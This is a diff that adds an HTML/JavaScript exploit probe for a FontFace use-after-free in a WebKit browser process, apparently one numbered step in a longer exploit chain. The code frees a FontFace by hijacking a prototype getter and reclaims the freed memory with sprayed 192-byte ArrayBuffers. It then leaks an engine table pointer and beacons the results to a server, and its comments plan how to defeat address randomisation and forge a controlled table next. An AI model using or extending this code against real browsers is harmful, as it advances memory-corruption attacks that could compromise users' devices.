@@ -1,0 +1,165 @@
+<!--
+  p663: groom distance — is (T1 - spray buffer VA) stable within a WebProcess
+  generation? If yes, self-address is derivable from the leak itself and the
+  central gap of the whole chain closes without a new bug.
+
+  Facts from the bench ledger:
+    - T1 is IDENTICAL within a page generation (7 consecutive entries) and
+      drifts only across WebProcess restarts.
+    - Phase-1 192B reclaim always lands in the EARLY lanes of the spray
+      (p656k/n: hit=4/5; p570g: b36-57 across 72-lane concentrated spray).
+    - bmalloc serves same-size-class allocations from a per-size freelist:
+      distance between consecutive 192B allocations is small and structural
+      (allocation granularity + header), not random.
+
+  Experiment (multi-UAF in ONE page — infra proven p652/p599/p656):
+    Stage per round r:
+      - fresh style + fresh FontFace (fa_r) + fonts.load trigger + delete
+      - spray: 24 x 192B seeded (rc=r+1 marker per round)
+      - hit = the lane whose +0x58 goes non-zero (engine table write)
+      - record: T_r (the leaked table ptr), hit-lane, and the 48-byte
+        neighborhood snapshot around +0x58..+0x80 of the hit lane
+    ROUNDS = 5. Then beacon the tuple list.
+
+  Derivation logic (on-device, cheap):
+    - If T_r are all EQUAL within a page (expected per ledger): the table is
+      allocated once per set; each round's fresh table would DIFFER. Equal T
+      across rounds => we are reading the SAME table => rounds share the set
+      table => distances between the hit lanes and T are comparable.
+    - The value we actually need is |T_r - laneVA|; laneVA is unknown, BUT
+      the DIFFERENCE of distances between rounds is computable if lanes are
+      adjacent: lane_{r+1} - lane_r = k * 192 + header. We measure the
+      empirical lane delta via the marker ordering and check consistency.
+
+  Honest note: a JS page cannot read its own buffer VA — that is the very
+  gap being attacked. What this probe measures is the STABILITY STRUCTURE
+  (T identity, lane ordering, hit-lane spread) that the address-arithmetic
+  argument needs. The arithmetic itself lands in p664 (forge +0x58 with
+  T-derived guesses = controlled-table attempt).
+
+  Beacon: P663-.
+  CRASH_CLASS: HIGH (FontFace UAF family, proven trigger matrix).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p663</title></head>
+<body>p663: groom distance structure
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P663-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'groom-distance r5');
+flush();
+
+var ROUNDS = 4;   /* v4: 5th round never survives (promise accumulation);
+                     R0-R3 complete = parity law + both bands measured */
+var round = 0;
+var results = [];
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 100 + round, true);   /* rc seed encodes round */
+      dv.setUint32(0x04, 0x5A5A0000 | round, true);
+      dv.setUint32(0x08, i, true);             /* lane id */
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);   /* keep every wrapper rooted (p656b law) */
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeRound, 150);
+}
+
+function analyzeRound() {
+  try {
+    var hit = -1;
+    for (var i = 0; i < spray.length; i++) {
+      if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) { hit = i; break; }
+    }
+    if (hit < 0) {
+      emit('R' + round, 'MISS');
+      flush();
+    } else {
+      var dv = spray[hit];
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var rc = dv.getUint32(0x00, true);
+      /* neighborhood: how many lanes around the hit are dirty too */
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo), rc: rc, near: dirtyNear });
+      emit('R' + round, 'hit=' + hit + ' lane-id=' + dv.getUint32(0x08, true) +
+           ' T=' + hex32(tHi) + hex32(tLo) + ' W=' + hex32(wHi) + hex32(wLo) +
+           ' rc=' + rc + ' dirtyNear=' + dirtyNear);
+      flush();
+    }
+    round++;
+    if (round < ROUNDS) {
+      /* keep faces alive (p656b law): nulling the wrapper mid-load kills the
+         page at the next round's trigger — observed 23:38 */
+      setTimeout(beginRound, 250);
+    } else {
+      /* summary: T identity across rounds + lane spread */
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      var spread = Math.max.apply(null, lanes) - Math.min.apply(null, lanes);
+      emit('SUMMARY', 'rounds=' + results.length + ' distinctT=' + keys.length +
+           ' lanes=[' + lanes.join(',') + '] spread=' + spread);
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end');
+      flush();
+    }
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
